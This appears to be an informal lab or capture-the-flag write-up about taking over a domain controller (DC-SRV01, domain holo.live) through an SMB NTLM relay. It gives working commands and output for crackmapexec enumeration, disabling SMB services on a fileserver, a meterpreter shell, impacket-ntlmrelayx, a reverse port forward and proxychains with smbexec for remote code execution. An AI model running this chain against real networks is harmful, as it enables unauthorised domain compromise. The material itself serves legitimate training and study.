## DC-SRV01
IP: 10.200.111.30
* * *
Enumerating the whole 10.200.111.0/24 with crackmap shows us that some machines(DC) have not enabled smb signing:

┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# crackmapexec smb 10.200.111.0/24
SMB         10.200.111.35   445    PC-FILESRV01     [*] Windows 10.0 Build 17763 x64 (name:PC-FILESRV01) (domain:holo.live) (signing:False) (SMBv1:False)
SMB         10.200.111.31   445    S-SRV01          [*] Windows 10.0 Build 17763 x64 (name:S-SRV01) (domain:holo.live) (signing:False) (SMBv1:False)
SMB         10.200.111.30   445    DC-SRV01         [*] Windows 10.0 Build 17763 x64 (name:DC-SRV01) (domain:holo.live) (signing:False) (SMBv1:False)


Having full admin on PC-FILESRV01 we can do a NTLMRelay exploit.

1. Disable on fileserver:
Command used: sc stop netlogon

Next, we need to disable and stop the SMB server from starting at boot. We can do this by disabling LanManServer and modifying the configuration. Find the command used below.

Command used: sc stop lanmanserver and sc config lanmanserver start= disabled

To entirely stop SMB, we will also need to disable LanManServer and modify its configuration. Find the command used below.

Command used: sc stop lanmanworkstation and sc config lanmanworkstation start= disabled
2. Restart Fileserver
3. Upload a meterpretes payload and get a full msfconsole shell
4. Start NTLM relay towards the DC ip
 └─# impacket-ntlmrelayx -t smb://10.200.111.30 -smb2support -socks
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to single host
[*] SOCKS proxy started. Listening at port 1080
[*] SMB Socks Plugin loaded..
[*] SMTP Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] MSSQL Socks Plugin loaded..
[*] IMAPS Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

6. Add a port forwarding on SMB in metasploit: portfwd add -R -L 0.0.0.0 -l 445 -p 445
7. Add proxy from NTLM realy in proxychain: socks4 127.0.0.1 1080
8. Run for RCE: proxychains impacket-smbexec -no-pass HOLOLIVE/SRV-ADMIN@10.200.111.30

Now we can add ourserlf to admin group, and should be able to rpd in.
That's all folks.
